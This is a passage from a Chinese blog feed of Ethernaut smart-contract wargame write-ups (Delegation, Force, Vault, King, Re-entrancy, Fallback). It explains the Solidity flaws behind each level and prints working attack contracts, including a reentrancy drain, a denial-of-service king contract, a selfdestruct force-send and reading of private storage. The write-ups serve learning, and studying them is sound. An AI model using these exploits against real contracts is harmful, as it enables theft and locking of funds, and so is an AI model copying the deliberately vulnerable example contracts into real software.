{</span><br><span class="line">    address target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) {</span><br><span class="line">        target = _target;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function hack(uint256 gas) external {    </span><br><span class="line">        uint64 uintKey = uint64(uint160(address(msg.sender)));    </span><br><span class="line">        bytes8 key = bytes8(uintKey) &amp; 0xFFFFFFFF0000FFFF;    </span><br><span class="line">        (bool sent,) = address(target).call{gas: gas}(abi.encodeWithSignature("enter(bytes8)", key));    </span><br><span class="line">        require(sent, "Transaction failed");</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;通过守门人，注册为参赛者，才能通过这一关。&lt;/p&gt;
&lt;p&gt;复习 Telephone 和 Token。&lt;/p&gt;
&lt;p&gt;也就是tx和msg的属性，以及数据下溢。&lt;/p&gt;
&lt;p&gt;额外还有一个 &lt;code&gt;gasleft()&lt;/code&gt;函数，可以返回剩余gas数量。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Delegation</title>
    <link href="http://cishoon.top/ethernaut/07-Delegation/"/>
    <id>http://cishoon.top/ethernaut/07-Delegation/</id>
    <published>2024-12-21T16:00:00.000Z</published>
    <updated>2024-12-22T06:40:29.964Z</updated>
    
    <content type="html"><![CDATA[<p>第二天，在玩几个题。</p><p>这题要了解Solidity的delegatecall函数。</p><span id="more"></span><h1 id="delegatecall">delegatecall</h1><p>有两个函数用于调用其他智能合约函数：call和delegatecall。</p><p>为了区分清楚，使用delegatecall的合约称为<strong>调用合约</strong>，被调用的称为<strong>目标合约</strong>。</p><p>delegatecall更加底层一点，相当于直接把目标合约函数的字节码拿过来，继续执行，其他什么都不改。</p><p>而call稍微执行的复杂一点，会去修改执行环境的存储空间和上下文。</p><p>总而言之：</p><table><colgroup><col style="width: 7%"><col style="width: 43%"><col style="width: 49%"></colgroup><thead><tr><th>特性</th><th>call</th><th>delegatecall</th></tr></thead><tbody><tr><td>存储</td><td>修改目标合约的存储</td><td>修改调用合约的存储</td></tr><tr><td>上下文</td><td>执行目标合约的上下文，使用目标合约的环境变量</td><td>执行目标合约的代码，但使用调用合约的存储和环境变量</td></tr><tr><td>合约地址</td><td>调用目标合约的地址</td><td>调用合约的地址（this 指向调用合约）</td></tr></tbody></table><h1 id="methods-id">Methods ID</h1><p>Method ID（方法标识符，函数选择器）是一个 <strong>4 字节</strong>长度的哈希值，它用于标识调用函数的标识符。方法 ID 是从函数的<strong>函数签名</strong>生成的，函数签名是由函数名称和参数类型（包括返回值类型）组成的字符串。它被用作区分不同函数的标识符，尤其是在与合约进行低级调用时。</p><p>可以用abi的encodeWithSignature计算ID例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature("setValue(uint256)", _value)</span><br></pre></td></tr></table></figure><p>理论上这样计算出来的函数ID有可能发生冲突，但是概率非常低。或许有可能被里用这个漏洞。</p><h1 id="解题">解题</h1><p>了解了这些，这一题就很简单了。</p><p>获取pwn的Methods ID</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_ethers.utils.id("pwn()").slice(0,10)</span><br><span class="line">'0xdd365b8b'</span><br></pre></td></tr></table></figure><p>然后直接发送事务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">await contract.sendTransaction({data: '0xdd365b8b'})</span><br></pre></td></tr></table></figure><p>正常调用合约函数的时候，本质上也是发送事务，只不过自动设置了data。</p><p>例如，合约的 transfer(address,uint256) 函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa9059cbb  // 4 字节 Method ID（函数签名：transfer(address,uint256)）</span><br><span class="line">0x000000000000000000000000abc1234567890def1234567890abcdef12345678  // 地址参数：recipient</span><br><span class="line">0x000000000000000000000000000000000000000000000000000000000000001e  // uint256 参数：amount</span><br></pre></td></tr></table></figure><p>调用transfer时，msg.data就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa9059cbb000000000000000000000000abc1234567890def1234567890abcdef1234567800000000000000000000000000000000000000000000000000000000000001e</span><br></pre></td></tr></table></figure><p>我们设置了msg.data，合约检测不到同名的函数，就执行fallback。</p><p><img src="/ethernaut/07-Delegation/image-20241222143546192.png" alt="image-20241222143546192" style="zoom:50%;"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第二天，在玩几个题。&lt;/p&gt;
&lt;p&gt;这题要了解Solidity的delegatecall函数。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Force</title>
    <link href="http://cishoon.top/ethernaut/08-Force/"/>
    <id>http://cishoon.top/ethernaut/08-Force/</id>
    <published>2024-12-21T16:00:00.000Z</published>
    <updated>2024-12-22T07:17:21.372Z</updated>
    
    <content type="html"><![CDATA[<p>第一个三星题。</p><p>这个合约啥也没有，目标是让合约的balance超过0。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force { /*</span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">    /~____  =ø= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ }</span><br></pre></td></tr></table></figure><p>这个题需要有额外知识：</p><p>selfdestruct 是 Solidity中的一个操作符，用于销毁合约并将其剩余的以太币转移到指定地址。调用该操作后，合约的代码和状态被从区块链中删除，合约余额会发送到指定的地址，释放存储空间。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selfdestruct(address payable recipient);</span><br></pre></td></tr></table></figure><p>所以写一个智能合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract AttackForce {</span><br><span class="line">    function attack(address payable target) public payable {</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {}</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>先给他转钱，然后销毁他把钱强行扔给Force合约。</p><p><img src="/ethernaut/08-Force/image-20241222151712979.png" alt="image-20241222151712979" style="zoom:50%;"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一个三星题。&lt;/p&gt;
&lt;p&gt;这个合约啥也没有，目标是让合约的balance超过0。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Vault</title>
    <link href="http://cishoon.top/ethernaut/09-Vault/"/>
    <id>http://cishoon.top/ethernaut/09-Vault/</id>
    <published>2024-12-21T16:00:00.000Z</published>
    <updated>2024-12-22T07:58:05.066Z</updated>
    
    <content type="html"><![CDATA[<p>解锁这个保险箱！</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault {</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password; // 隐藏的密码</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) {</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public { // 知道密码就可以破解了</span><br><span class="line">        if (password == _password) {</span><br><span class="line">            locked = false;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>隐藏的密码，private变量，知道密码就可以破解了。呃这怎么办。</p><p>创建这个智能合约肯定是个明文的事务，我得想办法获取这个明文事务的参数……</p><p>跑偏了，这就直接看创建题目的智能合约了，不太好不太好。</p><p>这题考私有变量获取。</p><h1 id="solidity合约内存空间">Solidity合约内存空间</h1><h2 id="storage">1 Storage</h2><ul><li>storage 是合约的永久存储空间，数据会持久存储在区块链上。</li><li>每个状态变量分配到一个 <strong>存储槽（storage slot）</strong>中，每个存储槽为 <strong>256 位（32 字节）</strong>。</li><li><strong>变量布局</strong>: Solidity按照变量声明的顺序将状态变量分配到存储槽中。</li><li>动态类型：<ul><li>动态数组 <code>uint256[]</code>，slot 0里存数组长度，keccak256(0) +i 对应第i个元素的位置</li><li>结构体，按字节顺序塞满存储槽，一个不够就连续</li><li>Map：键 k 的值存储在 keccak256(abi.encode(k, slot)) 的位置。</li></ul></li></ul><h2 id="memory">2 Memory</h2><ul><li>memory是用于临时存储数据的内存空间，在合约调用期间存在，调用结束后会被销毁。</li><li>memory 中的访问速度比 storage 快得多。</li><li><strong>动态分配</strong>:当存储动态数组（如字符串、字节数组）时，memory的大小在运行时动态分配。</li></ul><h2 id="calldata">3 calldata</h2><p>就是 msg.data 里的内容。</p><h1 id="解题">解题</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> res = <span class="keyword">await</span> provider.<span class="title function_">getStorage</span>(<span class="variable constant_">CONTRACT_ADDRESS</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"><span class="comment">// byte32转string</span></span><br><span class="line"><span class="keyword">let</span> str = ethers.<span class="title function_">toUtf8String</span>(res);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span><br><span class="line">A very strong secret password :)</span><br></pre></td></tr></table></figure><p><img src="/ethernaut/09-Vault/image-20241222155800089.png" alt="image-20241222155800089" style="zoom:50%;"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;解锁这个保险箱！&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - King</title>
    <link href="http://cishoon.top/ethernaut/10-King/"/>
    <id>http://cishoon.top/ethernaut/10-King/</id>
    <published>2024-12-21T16:00:00.000Z</published>
    <updated>2024-12-22T09:18:35.497Z</updated>
    
    <content type="html"><![CDATA[<p>这个游戏的Key！</p><p>题目：一个简单的游戏，谁发送更多的ether谁就变成新的king！在这样的活动中，被推翻的国王会得到新的奖励，在这个过程中赚一点以太币！就像庞氏骗局一样xD。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King {</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">// 初始owner和king，以及初始的prize</span><br><span class="line">    constructor() payable {</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// 可以收钱</span><br><span class="line">    receive() external payable {</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner); // 如果发的钱更多，成为新的king！</span><br><span class="line">        </span><br><span class="line">        payable(king).transfer(msg.value); // king收到转过来的钱</span><br><span class="line">        king = msg.sender; // 更新king和prize</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) {</span><br><span class="line">        return king;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>当我提交评测的时候，他会回收king，也就是转入更多的钱把自己变回king？</p><p>我要做的并不是变成king，而是让他无法回收king。</p><p>！我想到个方法，如果能让我称王后，所有后续receive都无法执行都会revert就行。但是好像做不到）</p><p>查到了！</p><blockquote><p>transfer 有一个内置的安全机制，它将转账金额限制为 2300gas。这个限制确保了接收方合约在执行转账时不会进行复杂的操作，防止某些合约被恶意攻击，或者耗尽大量gas 导致重入攻击漏洞。</p></blockquote><p>噢噢，就是transfer的接收方收到钱后，执行 receive函数，不能消耗超过2300的gas。</p><p>所以我写一个复杂的合约，让他称王！别人都改不了了！</p><h1 id="transfer的安全机制">Transfer的安全机制</h1><p>transfer 有一个内置的安全机制，它将转账金额限制为 2300gas。这个限制确保了接收方合约在执行转账时不会进行复杂的操作，防止某些合约被恶意攻击，或者耗尽大量gas 导致重入攻击漏洞。</p><h1 id="解题">解题</h1><p>我写了个函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AttackKing {</span><br><span class="line">    bool public flag;</span><br><span class="line"></span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    constructor() {</span><br><span class="line">        flag = false;</span><br><span class="line">        owner = payable(msg.sender);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function withdraw() external payable {</span><br><span class="line">        owner.transfer(getBalance());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {</span><br><span class="line">        if (flag) {</span><br><span class="line">            // 写一个会消耗大量gas的函数</span><br><span class="line">            uint256 sum = 0;</span><br><span class="line">            for (uint i = 0; i &lt; 100000000; i++) {</span><br><span class="line">                sum = sum + uint(i);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function setFlat(bool _flag) public {</span><br><span class="line">        flag = _flag;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function beKing(address payable target) external payable {</span><br><span class="line">        target.transfer(getBalance());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) {</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>但是这个 beKing有问题！2300gas其实是个非常小的数字，King合约的receive也超过了这个限制！所以不能使用Transfer，但是可以用call 来代替 Transfer。</p><p>所以改成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function beKing(address payable target) external payable {</span><br><span class="line">    (bool success, ) = target.call{value: address(this).balance}("");  // 使用 call 替代 transfer</span><br><span class="line">    require(success, "Transfer failed");</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h1 id="总结">总结</h1><p>Transfer转账有很强的gas限制，通常只用来给一个普通账户转账。</p><p>可以用 call 进行超过限制的转账！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success, ) = target.call{value: address(this).balance}("");  // 使用 call 替代 transfer</span><br><span class="line">require(success, "Transfer failed");</span><br></pre></td></tr></table></figure><blockquote><p>Most of Ethernaut's levels try to expose (in an oversimplified formof course) something that actually happened — a real hack or a realbug.</p><p>In this case, see: <span class="exturl" data-url="aHR0cHM6Ly93d3cua2luZ29mdGhlZXRoZXIuY29tL3Rocm9uZXMva2luZ29mdGhlZXRoZXIvaW5kZXguaHRtbA==">Kingof the Ether<i class="fa fa-external-link-alt"></i></span> and <span class="exturl" data-url="aHR0cDovL3d3dy5raW5nb2Z0aGVldGhlci5jb20vcG9zdG1vcnRlbS5odG1s">King of the EtherPostmortem<i class="fa fa-external-link-alt"></i></span>.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个游戏的Key！&lt;/p&gt;
&lt;p&gt;题目：一个简单的游戏，谁发送更多的ether谁就变成新的king！在这样的活动中，被推翻的国王会得到新的奖励，在这个过程中赚一点以太币！就像庞氏骗局一样
xD。&lt;/p&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Re-entrancy</title>
    <link href="http://cishoon.top/ethernaut/11-Re-entrancy/"/>
    <id>http://cishoon.top/ethernaut/11-Re-entrancy/</id>
    <published>2024-12-21T16:00:00.000Z</published>
    <updated>2024-12-22T16:48:40.931Z</updated>
    
    <content type="html"><![CDATA[<p>这次看标题应该就是重入攻击了。</p><p>目标是偷走合约的所有钱。</p><p>提示是：</p><ul><li>不可信合约可以在你最不期望的地方执行代码；</li><li>异常冒泡。</li></ul><span id="more"></span><p>先自己猜一猜怎么做。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12; // 0.6说明是一个以前合约的通病，现在已经被解决了</span><br><span class="line"></span><br><span class="line">import "openzeppelin-contracts-06/math/SafeMath.sol";</span><br><span class="line"></span><br><span class="line">contract Reentrance {</span><br><span class="line">    using SafeMath for uint256; // SafeMath，不会溢出。</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances; // 每个账户有钱</span><br><span class="line"></span><br><span class="line">// donate可以给别的地址转账</span><br><span class="line">    function donate(address _to) public payable {</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// 查某个地址的钱</span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) {</span><br><span class="line">        return balances[_who];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// 退款</span><br><span class="line">    function withdraw(uint256 _amount) public {</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) { // 如果发请求人账户里有足够的钱</span><br><span class="line">            (bool result,) = msg.sender.call{value: _amount}(""); // 就把钱发回去</span><br><span class="line">            </span><br><span class="line">            // 这里有点奇怪？</span><br><span class="line">            // 不管成不成功，都会扣钱</span><br><span class="line">            if (result) {</span><br><span class="line">                _amount;</span><br><span class="line">            }</span><br><span class="line">            balances[msg.sender] -= _amount; // 还是会下溢！！！因为没有显示调用SafeMath</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {}</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>之前我们知道，事务是原子性的，每一个事务要么全部发生，要么全部不发生。</p><p>但是，这里退款是用的是call，call是不是会让合约变成异步的？</p><p>不对，因为如果是异步的，bool result 就没有意义。</p><h1 id="call">call</h1><p>以下是一大段废话：</p><blockquote><p>首先，一定是<strong>同步执行</strong>。</p><p>call执行过程中，可能出现失败。比如目标合约代码抛出异常或revert，这时候会返回false，但不会触发revert。</p><p>这里的执行call就很危险，因为他执行的代码是其他合约的代码，是不可信的代码。</p><p>执行的过程，报错了，则会让返回值变成false。然鹅，即使返回false，也还是会扣掉账户里的钱，而我也不会收到钱。</p><p>我没收到钱，我账户里的钱变少了.</p><p>我希望的是，我收到了钱，但是balance里没减少。所以应该call其实执行成功了，但是调用他的合约却被迫发生了revert。</p><p>执行call有没有可能直接失败，不返回结果，就回退？x</p><p>有没有可能call调用的函数没有回滚，也返回false？</p><p>https://professional-solidity.readthedocs.io/zh-cn/latest/source/06.error.html</p><p>如果异常在子调用发生，那么异常会自动冒泡到顶层（例如：异常会重新抛出），除非他们在<code>try/catch</code> 语句中捕获了错误。 但是如果是在 <code>send</code>和 低级 <code>call</code>, <code>delegatecall</code> 和<code>staticcall</code> 的调用里发生异常时， 他们会返回<code>false</code> （第一个返回值） 而不是冒泡异常。</p><p>警告注意：根据 EVM 的设计，如果被调用的地址不存在，低级别函数<code>call</code>, <code>delegatecall</code> 和 <code>staticcall</code>第一个返回值同样是 <code>true</code>。如果需要，请在调用之前检查账号的存在性。</p><p>函数 assert 和 require 可用于检查条件并在条件不满足时抛出异常。</p></blockquote><h1 id="题解">题解</h1><p>因为每次withdraw，Reentrance执行转账，无论成功与否，都会在balance里扣除钱。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">interface Reentrance {</span><br><span class="line">    function donate(address _to) external payable;</span><br><span class="line">    function withdraw(uint256 _amount) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract Attack {</span><br><span class="line">    Reentrance public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public {</span><br><span class="line">        target = Reentrance(_target);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // Fallback function, will be called when the contract receives ether</span><br><span class="line">    receive() external payable {</span><br><span class="line">        uint256 balance = address(target).balance;</span><br><span class="line">        if (balance &gt; 0) {</span><br><span class="line">            target.withdraw(balance);  // 重入调用</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // 发起攻击的函数</span><br><span class="line">    function attack() external payable {</span><br><span class="line">        require(msg.value &gt; 0, "Send some ether to attack");</span><br><span class="line">        target.donate{value: msg.value}(address(this));  // 向目标合约捐款</span><br><span class="line">        target.withdraw(msg.value);  // 开始提款</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // 用于撤回攻击所得的以太币</span><br><span class="line">    function withdraw() external {</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>卡了很久……但是我好像想复杂了。</p><p>重入攻击通过receive再次调用withdraw很早就想到了，我明白中间有一个时刻，合约拿到了所有的钱，但是我以为最终会被：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">balances[msg.sender] -= _amount; </span><br></pre></td></tr></table></figure><p>报错发生回退，最终导致所有调用都不成功。</p><p>但是！！！！！SafeMath必须要显示调用 .add.sub，才是用了SafeMath！！！</p><p>这里其实还发生了下溢！！！！！！！</p><p>看了一下确实！！！！</p><figure><img src="/ethernaut/11-Re-entrancy/image-20241223004815790.png" alt="image-20241223004815790"><figcaption aria-hidden="true">image-20241223004815790</figcaption></figure><figure><img src="/ethernaut/11-Re-entrancy/image-20241222230240638.png" alt="image-20241222230240638"><figcaption aria-hidden="true">image-20241222230240638</figcaption></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这次看标题应该就是重入攻击了。&lt;/p&gt;
&lt;p&gt;目标是偷走合约的所有钱。&lt;/p&gt;
&lt;p&gt;提示是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不可信合约可以在你最不期望的地方执行代码；&lt;/li&gt;
&lt;li&gt;异常冒泡。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Ethernaut" scheme="http://cishoon.top/categories/Ethernaut/"/>
    
    
    <category term="以太坊" scheme="http://cishoon.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="智能合约" scheme="http://cishoon.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    <category term="Ethernaut" scheme="http://cishoon.top/tags/Ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut - Fallback</title>
    <link href="http://cishoon.top/ethernaut/02-Fallback/"/>
    <id>http://cishoon.top/ethernaut/02-Fallback/</id>
    <published>2024-12-20T16:00:00.000Z</published>
    <updated>2024-12-22T06:11:55.767Z</updated>
    
    <content type="html"><![CDATA[<p>阅读智能合约源码，任务：</p><ul><li>声明自己为合约的 ownership</li><li>减少 balance 到0</li></ul><p>学习目标：</p><ul><li>使用ABI发送ether</li><li>不用ABI发送ether</li><li>转换wei和ether的单位</li><li>回调函数 Fallback</li></ul><span id="more"></span><p><strong>ABI</strong> 是智能合约与外部世界（如 DApp、前端、Web3.js等）交互的标准接口。它描述了一个智能合约的所有可调用函数、事件和数据结构。</p><p>简单来说就是用 contract 调用合约函数。</p><p>一起来看智能合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback {</span><br><span class="line">// 两个成员变量，一个记录每个账号的贡献，一个记录谁是这个合约的owner</span><br><span class="line">    mapping(address =&gt; uint256) public contributions; </span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">// 构造函数，不以function开头的函数都是某种回调函数。</span><br><span class="line">// 构造函数就是在合约被实例化时会调用的函数。</span><br><span class="line">// 作用是设置初始owner（创建合约的账户，这里是网站自己生成的其他账户，反正不是你）</span><br><span class="line">// 并且设置这个账户的贡献是1000 ether，很富</span><br><span class="line">    constructor() {</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// modifier，装饰器，这个可以被写在其他函数声明里，表示执行这个函数前，</span><br><span class="line">// 必须通过装饰器的检查</span><br><span class="line">    modifier onlyOwner() {</span><br><span class="line">        require(msg.sender == owner, "caller is not the owner");</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// 一个public函数，可以通过abi调用</span><br><span class="line">    function contribute() public payable {</span><br><span class="line">        require(msg.value &lt; 0.001 ether); // 必须提供0.001以上的ether</span><br><span class="line">        contributions[msg.sender] += msg.value; // 记录你的贡献</span><br><span class="line">        // 如果你的贡献比owner大，你就成为了新owner</span><br><span class="line">        // 也就是你得发1000个以上的ether，显然你很难拿到这么多以太币</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) {</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// view关键字的作用是表示这个函数不会修改区块链状态，就是只读的意思</span><br><span class="line">// 这就不会发起交易，不消耗gas</span><br><span class="line">    function getContribution() public view returns (uint256) {</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// 调用了onlyOwner的modifier，只有owner可以调用这个函数</span><br><span class="line">// 作用是把钱还给你，不然白白浪费了</span><br><span class="line">    function withdraw() public onlyOwner {</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">// 前面提到过，不是以function开头的都是回调函数</span><br><span class="line">// 当合约收到带有value的交易，就会调用receive函数</span><br><span class="line">// 执行 contribute 两次，并且记得贡献0.001以上的ether，就变成owner了</span><br><span class="line">// 或者可以省一点钱，第二次不调用contribute，直接web3.eth.sendTransaction转账</span><br><span class="line">    receive() external payable {</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    }</span><br><span class="line">    // external 关键字表示这个函数不能被内部调用</span><br><span class="line">    // payable关键字表示这个函数可以接受转账、或是可以转出</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h1 id="调用合约的方法">调用合约的方法</h1><h2 id="web3.js">web3.js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="property">methods</span>.<span class="title function_">someFunction</span>(arg1, arg2).<span class="title function_">send</span>({</span><br><span class="line">  <span class="attr">from</span>: <span class="string">'0xYourAddress'</span>,                  <span class="comment">// 发送交易的地址</span></span><br><span class="line">  <span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">'1'</span>, <span class="string">'ether'</span>), <span class="comment">// msg.value 设置为 1 ETH</span></span><br><span class="line">  <span class="attr">gas</span>: <span class="number">3000000</span>,                          <span class="comment">// 设置最大 Gas 数量</span></span><br><span class="line">  <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">'20'</span>, <span class="string">'gwei'</span>) <span class="comment">// 设置 Gas 价格为 20 Gwei</span></span><br><span class="line">});</span><br></pre></td></tr></table></figure><h2 id="ether.js">ether.js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">someFunction</span>(arg1, arg2, {</span><br><span class="line">  <span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">'1'</span>), <span class="comment">// msg.value 设置为 1 ETH</span></span><br><span class="line">  <span class="attr">gasLimit</span>: <span class="number">3000000</span>,                  <span 